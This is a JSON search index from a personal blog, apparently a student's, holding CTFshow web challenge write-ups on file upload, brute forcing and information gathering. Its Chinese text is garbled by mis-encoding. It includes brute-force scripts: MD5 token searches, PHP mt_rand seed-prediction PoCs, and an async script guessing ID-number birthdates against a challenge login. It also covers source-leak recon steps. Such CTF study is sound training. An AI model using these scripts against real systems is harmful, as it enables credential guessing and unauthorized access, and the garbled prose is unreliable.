/var/www/html/flag.php\u0026#39;);\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"web152\"\u003eweb152\u003c/h4\u003e\n\u003cp\u003eè¿™é“é¢˜æ²¡æœ‰å‰ç«¯æ£€éªŒï¼Œä½†æ˜¯è§£æ³•è·Ÿweb151æ˜¯ä¸€æ ·çš„\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162605410\" loading=\"lazy\" src=\"../assets/image-20250126162605410.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"web153\"\u003eweb153\u003c/h4\u003e\n\u003cp\u003eä¸€å¼€å§‹å°è¯•äº†å¤§å°å†™ç»•è¿‡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162904156\" loading=\"lazy\" src=\"../assets/image-20250126162904156.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸Šä¼ åå‘ç°æœåŠ¡å™¨ä¸è§£æ\u003c/p\u003e","title":"CTFSHOW-æ–‡ä»¶ä¸Šä¼ -Writeup"},{"content":"web21 æŠ“ä¸ªåŒ…\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„è´¦å·å¯†ç æ˜¯é€šè¿‡base64ç¼–ç åŠ å¯†åå†å‘é€çš„ï¼Œé—®é¢˜ä¸å¤§\npayloadè®¾ç½®å¦‚ä¸‹\næˆ‘ä»¬è¿˜è¦è®¾ç½®ä¸€ä¸‹payloadå¤„ç†\nå¼€å§‹çˆ†ç ´ï¼Œæ ¹æ®é•¿åº¦æˆ–è€…çŠ¶æ€ç åˆ¤æ–­å³å¯\nweb22 åŸŸåçˆ†ç ´\né€šè¿‡çˆ†ç ´ctf.showçš„å­åŸŸåå¯ä»¥çˆ†ç ´åˆ°flag.ctf.show\nè®¿é—®å³å¯å¾—åˆ°flag(è™½ç„¶å·²ç»æŒ‚äº†)\nweb23 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 11:43:51 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 11:56:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14 15include(\u0026#39;flag.php\u0026#39;); 16if(isset($_GET[\u0026#39;token\u0026#39;])){ 17 $token = md5($_GET[\u0026#39;token\u0026#39;]); 18 if(substr($token, 1,1)===substr($token, 14,1) \u0026amp;\u0026amp; substr($token, 14,1) ===substr($token, 17,1)){ 19 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 20 echo $flag; 21 } 22 } 23}else{ 24 highlight_file(__FILE__); 25 26} 27?\u0026gt; åˆ†æä»£ç å¯çŸ¥ï¼š éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ token å€¼ï¼Œä½¿å¾—ä»¥ä¸‹æ¡ä»¶æˆç«‹ï¼š\n1ã€md5(token) çš„ç¬¬ 1 ä½ï¼ˆä» 0 å¼€å§‹ç®—ï¼‰ç­‰äºç¬¬ 14 ä½\n2ã€md5(token) çš„ç¬¬ 14 ä½ç­‰äºç¬¬ 17 ä½ã€‚\n3ã€md5(token) çš„ç¬¬ 1 ä½çš„æ•´æ•°å€¼ã€14 ä½çš„æ•´æ•°å€¼ã€å’Œ 17 ä½çš„æ•´æ•°å€¼çš„å’Œé™¤ä»¥ç¬¬ 1 ä½çš„æ•´æ•°å€¼ç­‰äºç¬¬ 31 ä½çš„æ•´æ•°å€¼ã€‚\næ—¢ç„¶ä¸çŸ¥é“æ€ä¹ˆå‡‘é‚£æˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´\né€šè¿‡bpçˆ†ç ´ä¸€ä¸‹1-1000ä¸­æ˜¯å¦æœ‰ç¬¦åˆä¸Šè¿°æ¡ä»¶çš„å­—ç¬¦ä¸²\nå“æˆ‘è‰ï¼Œæ€ä¹ˆå°±çˆ†ç ´å‡ºæ¥äº†ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆçº¯æ•°å­—è¿˜èƒ½çˆ†å‡ºæ¥\nå…¶ä»–è§£æ³•ï¼Œå¯ä»¥ç”¨å¤§ä½¬çš„è„šæœ¬\n1# coding: utf-8 2# alberthao 3import hashlib 4 5dic = \u0026#39;0123456789qazwsxedcrfvtgbyhnujmikolp\u0026#39; 6for a in dic: 7 for b in dic: 8 t = str(a) + str(b) 9 md5 = hashlib.md5(t.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 10 # print md5 11 # print md5[1:2] 12 # print md5[14:15] 13 # print md5[17:18] 14 if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: 15 if (ord(md5[1:2])) \u0026gt;= 48 and ord(md5[1:2]) \u0026lt;= 57 and (ord(md5[14:15])) \u0026gt;= 48 and ord(md5[14:15]) \u0026lt;= 57: 16 if (ord(md5[17:18])) \u0026gt;= 48 and ord(md5[17:18]) \u0026lt;= 57 and (ord(md5[31:32])) \u0026gt;= 48 and ord( 17 md5[31:32]) \u0026lt;= 57: 18 if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2]) == int(md5[31:32]): 19 print(t) or\n1import hashlib 2for i in range(1,10000): 3 4md5 = hashlib.md5(str(i).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 5 6if md5[1] != md5[14] or md5[14]!= md5[17]: 7\tcontinue 8 9if(ord(md5[1]))\u0026gt;=48 and ord(md5[1])\u0026lt;=57 and (ord(md5[31]))\u0026gt;=48 and ord(md5[31])\u0026lt;=57: 10 11\tif((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])): 12 13\tprint(i) web24 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:26:39 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 13:53:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_GET[\u0026#39;r\u0026#39;])){ 17 $r = $_GET[\u0026#39;r\u0026#39;]; 18 mt_srand(372619038); 19 if(intval($r)===intval(mt_rand())){ 20 echo $flag; 21 } 22}else{ 23 highlight_file(__FILE__); 24 echo system(\u0026#39;cat /proc/version\u0026#39;); 25} 26 27?\u0026gt; è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªphpä¼ªéšæœºæ•°çš„é¢˜ç›®\nmt_scrand(seed)è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœº æ•°ã€‚ æç¤ºï¼šä» PHP 4.2.0 å¼€å§‹ï¼Œéšæœºæ•°ç”Ÿæˆå™¨è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•° å› æ­¤ä¸éœ€è¦æ’­ç§ï¼Œå¹¶ä¸”å¦‚æœè®¾ç½®äº† seedå‚æ•° ç”Ÿæˆçš„éšæœºæ•°å°±æ˜¯ä¼ªéšæœºæ•°ï¼Œæ„æ€å°±æ˜¯æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•° æ˜¯ä¸€æ ·çš„\nè™½ç„¶è¯´æ˜¯éšæœºæ•°ï¼Œä½†æ˜¯åŒä¸€ä¸ªç§å­ä¼šç”ŸæˆåŒä¸€ä¸²æ•°å­—\npoc\n1\u0026lt;?php 2mt_srand(372619038); 3echo intval(mt_rand()); 4?\u0026gt; ä¸çŸ¥é“è·Ÿç‰ˆæœ¬æœ‰æ²¡æœ‰å…³ç³»ï¼Œæˆ‘éšä¾¿æ‰¾çš„phpåœ¨çº¿è¿è¡Œï¼ŒæˆåŠŸå¾—åˆ°flag\nweb25 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:56:57 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 15:47:33 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15error_reporting(0); 16include(\u0026#34;flag.php\u0026#34;); 17if(isset($_GET[\u0026#39;r\u0026#39;])){ 18 $r = $_GET[\u0026#39;r\u0026#39;]; 19 mt_srand(hexdec(substr(md5($flag), 0,8))); 20 $rand = intval($r)-intval(mt_rand()); 21 if((!$rand)){ 22 if($_COOKIE[\u0026#39;token\u0026#39;]==(mt_rand()+mt_rand())){ 23 echo $flag; 24 } 25 }else{ 26 echo $rand; 27 } 28}else{ 29 highlight_file(__FILE__); 30 echo system(\u0026#39;cat /proc/version\u0026#39;); 31} ç»§ç»­phpä¼ªéšæœºæ•°\næˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªæ€§è´¨\nå½“mt_srand()ä¸­çš„ç§å­æ˜¯å›ºå®šçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”Ÿæˆçš„éšæœºæ•°çš„åºåˆ—å°±æ˜¯ç›¸åŒçš„ï¼Œå¦‚ä¸‹\n1\u0026lt;?php 2 3mt_srand(1852100618); 4 5echo mt_rand(); 6echo mt_rand(); 7echo mt_rand(); 8echo mt_rand(); 9 10\u0026#39;\u0026#39;\u0026#39; 111640856123 121390302953 13893879251 14859994814 åœ¨è¿™é“é¢˜é‡Œé¢æˆ‘ä»¬éœ€è¦å¾—åˆ°å‰ä¸‰ä¸ªéšæœºæ•°\nç¬¬ä¸€ä¸ªéšæœºæ•°æˆ‘ä»¬å¯ä»¥ä½¿r=0å¾—åˆ°ï¼Œç¬¬ä¸€ä¸ªéšæœºæ•°ä¸º1640856123\nå¾—åˆ°ç¬¬ä¸€ä¸ªéšæœºæ•°ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼å¾—åˆ°ç§å­ï¼Œä»è€Œå¾—åˆ°ç¬¬äºŒï¼Œç¬¬ä¸‰ä¸ªéšæœºæ•°\nphpè„šæœ¬(æå…¶æ…¢)\n1\u0026lt;?php 2$a= 390148868;//ç¬¬ä¸€ä¸ªéšæœºæ•° 3$b= 0 ; 4while (true){ 5 mt_srand($b); 6 if(mt_rand()==$a){ 7 echo \u0026#34;success:\u0026#34;+$b; 8 break; 9 } 10 echo $b; 11 echo \u0026#34;\\n\u0026#34;; 12 $b+=1; 13 14} æˆ–è€…ä½¿ç”¨php_mt_seed-4.0å·¥å…·\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸åŒç‰ˆæœ¬çš„seedæ˜¯ä¸åŒçš„ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªè¯•è¯•å°±è¡Œäº†\n1mt_srand(1852100618); 2echo mt_rand();// ç¬¬ä¸€æ¬¡éšæœºæ•°ï¼ˆä¸èƒ½å°‘ï¼‰ 3echo \u0026#34;\\ntokenï¼š\u0026#34;; 4echo (mt_rand()+mt_rand()); //ç¬¬äºŒå’Œç¬¬ä¸‰æ¬¡éšæœºæ•°ç›¸åŠ ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦å¯¹token å¾—åˆ°tokençš„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿randä¸ºé›¶å³å¯å¾—åˆ°flag\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ä½¿rç­‰äºç¬¬ä¸€æ¬¡éšæœºæ•°å³å¯\nä¼ å‚ï¼Œå¾—åˆ°flag\nweb26 è¿™ä¹ˆå¤šæˆ‘å’‹çˆ†ï¼ŒèµŒä¸€æŠŠåªçˆ†å¯†ç \nweb27 è¿™é¢˜æ˜¯ä¸€ä¸ªæ•™åŠ¡ç³»ç»Ÿï¼Œéœ€è¦é€šè¿‡è´¦å·å¯†ç ç™»å½•\nå…ˆä¿¡æ¯æ”¶é›†ä¸€ä¸‹\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è´¦å·å¯†ç ä¸‹é¢æœ‰ä¸€ä¸ªå½•å–åå•å’Œå­¦ç”Ÿå­¦ç±ä¿¡æ¯æŸ¥è¯¢ç³»ç»Ÿ\nåˆ†åˆ«å¦‚ä¸Šï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡çˆ†ç ´å­¦ç”Ÿçš„èº«ä»½è¯ä¿¡æ¯ä»è€Œé€šè¿‡å½•å–æŸ¥è¯¢æŸ¥åˆ°å­¦ç”Ÿçš„ä¿¡æ¯å‘¢ï¼Ÿ\nbpæŠ“ä¸ªåŒ…\nå“æˆ‘è‰ï¼Œæˆ‘æ•°æ®å‘¢\nforwardä¸€ä¸‹ï¼ˆæ˜¯å› ä¸ºæ•°æ®å®é™…ä¸Šåœ¨checkdb.phpæ‰æäº¤å—ï¼Ÿä¸æ˜¯å¾ˆæ‡‚ï¼‰\næˆ‘ä»¬å¯ä»¥å‘ç°å…¶å®èº«ä»½è¯ç¼ºå¤±çš„éƒ¨åˆ†åˆšå¥½æ˜¯å‡ºç”Ÿæ—¥æœŸ\né‚£æˆ‘ä»¬å¯ä»¥ç”¨bpä¸­çš„æ—¥æœŸçˆ†ç ´åŠŸèƒ½\nçˆ†å‡ºæ¥çš„msgç”¨unicodeè§£ç ä¸€ä¸‹å°±èƒ½å¾—åˆ°è´¦å·å¯†ç äº†\nè´´ä¸ªå¤§ä½¬çš„è„šæœ¬\n1url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; NUM=32 2 3def run_tasks(L): U=[] for i in L: U.append(asyncio.ensure_future(i)) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(U)) 4 5class TaskRuner: def init(self,n) -\u0026gt; None: self.L=[] for i in range(n): self.L.append(self.task_function(i)) self.task_num=n async def task_function(self,n): pass def run(self): run_tasks(self.L) self.on_over() def on_over(self): pass 6 7import aiohttp from urllib.parse import quote from datetime import date, timedelta 8 9class NYR: def init(self,start_date,end_date) -\u0026gt; None: self.start_date=start_date self.end_date=end_date self.delta = timedelta(days=1) self.current_date = start_date def next(self): t=self.current_date if t\u0026gt;self.end_date: return None self.current_date+=self.delta return t 10 11class Scanner(TaskRuner): def init(self,d1,d2,n) -\u0026gt; None: super().init(n) self.nyr=NYR(d1,d2) self.alive=True 12 13async def task_function(self, n): 14 while self.alive: 15 u=self.nyr.next() 16 if not u: 17 break 18 r=await self.login(u) 19 if r: 20 self.alive=False 21async def login(self,t:date): 22 url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; 23 n=t.year 24 y=t.month 25 r=t.day 26 n=str(n) 27 y=str(y) 28 r=str(r) 29 if len(y)==1: 30 y=\u0026#39;0\u0026#39;+y 31 if len(r)==1: 32 r=\u0026#39;0\u0026#39;+r 33 sfz=\u0026#39;621022\u0026#39;+n+y+r+\u0026#39;5237\u0026#39; 34 data={ 35 \u0026#39;a\u0026#39;:\u0026#39;é«˜å…ˆä¼Š\u0026#39;, 36 \u0026#39;p\u0026#39;:sfz, 37 } 38 sess=aiohttp.ClientSession() 39 try: 40 r=await sess.post(url=url,data=data,ssl=False) 41 text=await r.text() 42 js=loads(text) 43 msg=js[\u0026#39;msg\u0026#39;] 44 print(sfz,msg) 45 await sess.close() 46 return msg!=\u0026#39;æäº¤ä¿¡æ¯æœ‰è¯¯\u0026#39; 47 except Exception as e: 48 print(e) 49 pass 50 try: 51 await sess.close() 52 except: 53 pass 54 return False 55 56async def handle_up(self,u,p): 57 pass 58a=Scanner(date(1990,1,1),date(2010,12,12),NUM) 59 60a.run() web28 è¿™é¢˜æœ¬æ¥ä¸çŸ¥é“è¦å¹²å˜›\ndirsearchæ‰«ä¸€ä¸‹,æ„Ÿè§‰åº”è¯¥æ˜¯ç›®å½•çˆ†ç ´\nå…ˆçˆ†ç ´ä¸€ä¸‹0-100\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E7%88%86%E7%A0%B4/","summary":"\u003ch4 id=\"web21\"\u003eweb21\u003c/h4\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165104490\" loading=\"lazy\" src=\"../assets/image-20241123165104490.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŠ“ä¸ªåŒ…\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165621808\" loading=\"lazy\" src=\"../assets/image-20241123165621808.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„è´¦å·å¯†ç æ˜¯é€šè¿‡base64ç¼–ç åŠ å¯†åå†å‘é€çš„ï¼Œé—®é¢˜ä¸å¤§\u003c/p\u003e\n\u003cp\u003epayloadè®¾ç½®å¦‚ä¸‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123165947562\" loading=\"lazy\" src=\"../assets/image-20241123165947562.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123170139759\" loading=\"lazy\" src=\"../assets/image-20241123170139759.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬è¿˜è¦è®¾ç½®ä¸€ä¸‹payloadå¤„ç†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20241123170509504\" loading=\"lazy\" src=\"../assets/image-20241123170509504.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¼€å§‹çˆ†ç ´ï¼Œæ ¹æ®é•¿åº¦æˆ–è€…çŠ¶æ€ç åˆ¤æ–­å³å¯\u003c/p\u003e","title":"CTFSHOW-çˆ†ç ´-Writeup"},{"content":"Web 1-5 æŸ¥çœ‹ç½‘é¡µæºä»£ç  æŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿ æŸ¥çœ‹robots.txt phpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag Web6 ç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶\nè§£å‹æ–‡ä»¶æˆ‘ä»¬å¾—åˆ°\næ‰“å¼€fl00g.txtï¼Œæ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„flag\næ‰“å¼€index.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-01 14:37:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-01 14:42:44 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13//flag in fl000g.txt 14echo \u0026#34;web6:where is flag?\u0026#34; 15?\u0026gt; æ˜¾ç¤ºflag in fl00g.txt\nç›´æ¥è®¿é—®url/fl00g.txtå¾—åˆ°flag\nweb7 gitæ³„éœ²ï¼Œè®¿é—®url/.gitå³å¯å¾—åˆ°flag\nweb8 svnæ³„éœ²ï¼Œè®¿é—®url/.gitå³å¯å¾—åˆ°flag\nweb9 vimç¼“å­˜ä¿¡æ¯æ³„éœ²ï¼Œè®¿é—®url/index.php.swpï¼Œæ‰“å¼€ä¸‹è½½çš„index.php.swpå³å¯å¾—åˆ°flag\nweb10 æ ¹æ®hintæŸ¥çœ‹cookieå¯ä»¥çœ‹åˆ°\ncookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D\nè¿›è¡Œurlè§£ç å³å¯å¾—åˆ°flag\nweb11 åŸŸåè§£æ\næˆ‘ä»¬å¯ä»¥é€šè¿‡nslookupæ¥è¿›è¡ŒåŸŸåè§£ææŸ¥è¯¢\nnslookup -qt=æ ¼å¼ URL nslookup -qt=any URL //éå†æ‰€æœ‰æ ¼å¼ nslookup -qt=TXT URL\r//æŸ¥è¯¢txtæ ¼å¼ web12 hintï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç \nå…ˆç”¨dirsearchæ‰«ä¸€ä¸‹\nè®¿é—®adminï¼Œè¦æ±‚æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œæ ¹æ®åå°è·¯å¾„æˆ‘ä»¬å¯ä»¥çŒœæµ‹è´¦å·ä¸ºadmin\nå›åˆ°ä¸»é¡µï¼Œåœ¨ç½‘é¡µçš„åº•éƒ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç”µè¯Help Line Number : 372619038\nçŒœæµ‹ç”µè¯ä¸ºç®¡ç†å‘˜å¯†ç ï¼Œè¾“å…¥åæˆåŠŸå¾—åˆ°flag\nweb13 åœ¨é¡µé¢åº•éƒ¨å¯ä»¥çœ‹åˆ°ä¸€ä¸ªdocument\nç‚¹å‡»å‘ç°ä¸‹è½½äº†ä¸€ä¸ªdocument.pdfæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œæœ‰åå°çš„åœ°å€å’Œè´¦å·å¯†ç \nd\nç™»å½•åå°å³å¯å¾—åˆ°flag\nweb14 æ ¹æ®hintçŸ¥é“editorå¤„åº”è¯¥æœ‰ä¿¡æ¯æ³„æ¼(è™½ç„¶ä¸çŸ¥é“ä»€ä¹ˆæ˜¯editor)\næˆ‘ä»¬å…ˆç”¨dirsearchæ‰«ä¸€ä¸‹åå°\nè®¿é—®url/editor\næ˜¯ä¸€ä¸ªæ–‡å­—ç¼–è¾‘çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ä¸Šä¼ é™„ä»¶ğŸ“å‡ºå¯ä»¥è°ƒç”¨å‡ºåˆ°æœåŠ¡å™¨çš„æ–‡ä»¶ç®¡ç†å™¨\nåœ¨æœåŠ¡å™¨çš„æ ¹ç›®å½•æ²¡çœ‹åˆ°flagï¼Œå°è¯•æŸ¥çœ‹ç½‘ç«™çš„æ ¹ç›®å½•(var/www/html),çœ‹çœ‹æœ‰æ²¡æœ‰éšè—é¡µé¢\nå‘ç°nothinghereæ–‡ä»¶å¤¹ä¸­æœ‰ä¸ªfl00g.txtæ–‡ä»¶\nè®¿é—®url/nothinghere/f1000g.txtå³å¯å¾—åˆ°flag\nweb15 æ‰«æåˆ°åå°ä¸ºurl/adminï¼Œæ‰“å¼€çœ‹åˆ°æœ‰ä¸ªå¿˜è®°å¯†ç ï¼Œè¦æ±‚è¾“å…¥åŸå¸‚\næ ¹æ®hintæˆ‘ä»¬å¯ä»¥åœ¨ä¸»é¡µåº•éƒ¨æ‰¾åˆ°ä¸€ä¸ªqqé‚®ç®±ï¼ŒæŸ¥è¯¢ä¸€ä¸‹qqå·\nå¾—åˆ°ä¿¡æ¯ï¼Œç°å±…é™•è¥¿è¥¿å®‰\nè¾“å…¥è¥¿å®‰æˆåŠŸé‡ç½®å¯†ç ï¼Œè¾“å…¥é‡ç½®å¯†ç å’Œå¸å·adminï¼ŒæˆåŠŸå¾—åˆ°flag\nWeb16 æ¢é’ˆæ³„æ¼\ndirsearch æ‰«æä¸åˆ°è¿™ä¸ªæ¢é’ˆï¼Œçœ‹wpæ‰çŸ¥é“çš„\næ¢é’ˆåœ¨url/tz.php\nè®¿é—®æ¢é’ˆ\nåœ¨æŒ‡é’ˆé‡Œé¢å¯ä»¥æ‰¾åˆ°phpinfoé¡µé¢\næ‰“å¼€åœ¨phpinfoé‡Œé¢å¯ä»¥æ‰¾åˆ°flag\nweb17 sqlå¤‡ä»½æ³„æ¼\nç”¨dirsearchæ‰«å‡ºæ¥å­˜åœ¨sqlå¤‡ä»½æ³„æ¼ï¼Œä¸‹è½½backup.sqlï¼Œæ‰“å¼€å¾—åˆ°flag\nweb18 æœ¬é¢˜æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œç©åˆ°101åˆ†å°±èƒ½å¾—åˆ°flag\næˆ‘ä»¬ç›´æ¥çœ‹js\nFlappy_js.js\nå®¡ä¸€ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“åˆ†æ•°å¤§äº100çš„æ—¶å€™ä¼šè¾“å‡ºè¿™æ®µæ–‡å­—ï¼Œè¿™æ®µæ–‡å­—çœ‹ç€åƒunidcodeç¼–ç ï¼Œè§£ç è¯•è¯•\næ ¹æ®æç¤ºè®¿é—®url/110.php,å¾—åˆ°flag\nweb19 é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•çš„é¡µé¢ï¼Œæ ¹æ®hintæŸ¥çœ‹ç½‘é¡µæºä»£ç \næ ¹æ®æç¤ºï¼Œè¿™é“é¢˜åº”è¯¥æ˜¯ä¸€é“å¯¹å¯†ç è¿›è¡Œäº†åŠ å¯†çš„é¢˜ç›®\nå®¡é˜…ä¸€ä¸‹ä»£ç æˆ‘ä»¬å¾—åˆ°è¿™äº›ä¿¡æ¯\nmodeæ¨¡å¼ï¼š CBC padding å¡«å……æ–¹å¼ï¼š ZeroPadding å¯†æ–‡è¾“å‡ºç¼–ç ï¼š åå…­è¿›åˆ¶hex åç§»é‡iv: ilove36dverymuch å¯†é’¥ï¼š0000000372619038 å¯†æ–‡ä¸ºï¼š a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\nAES åŠ å¯†/è§£å¯† - é”¤å­åœ¨çº¿å·¥å…·\nç”¨è§£å¯†å·¥å…·è§£å¯†ä¸€ä¸‹å¯†æ–‡æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¯†ç ä¸º\nè¾“å…¥å¯†ç ï¼Œå¾—åˆ°flag\nweb20 hintï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚\nè¿™æ˜¯ä¸€ä¸ªä½¿ç”¨accessæ•°æ®åº“çš„aspç¨‹åº\næ ¹æ®æç¤ºæœ¬é¢˜å­˜åœ¨mdbæ–‡ä»¶æ³„éœ²ï¼Œé‚£æˆ‘ä»¬ç›´æ¥è®¿é—®url/db/db.mdb\nä¸‹è½½db.mdbæ–‡ä»¶åç”¨è®°äº‹æœ¬æ‰“å¼€æœç´¢flagï¼Œå³å¯å¾—åˆ° flag{ctfshow_old_database}\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","summary":"\u003ch4 id=\"web-1-5\"\u003eWeb 1-5\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eæŸ¥çœ‹ç½‘é¡µæºä»£ç \u003c/li\u003e\n\u003cli\u003eæŠ“ä¸ªåŒ…çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿\u003c/li\u003e\n\u003cli\u003eæŸ¥çœ‹robots.txt\u003c/li\u003e\n\u003cli\u003ephpsæºç æ³„éœ²ï¼Œè®¿é—®index.phpsï¼Œé€šè¿‡å…¶æºç æ³„éœ²ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°flag\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"web6\"\u003eWeb6\u003c/h4\u003e\n\u003cp\u003eç½‘é¡µæç¤ºä¸‹è½½æºç æŸ¥çœ‹ï¼Œè®¿é—®url/www.zipå¾—åˆ°æºç æ–‡ä»¶\u003c/p\u003e","title":"CTFSHOW-ä¿¡æ¯æ”¶é›†-Writeup"},{"content":"A common student at GDUFS\u0026hellip;\n","permalink":"http://localhost:1313/about/","summary":"about","title":"å…³äº"},{"content":"","permalink":"http://localhost:1313/links/","summary":"links","title":"å‹é“¾"}]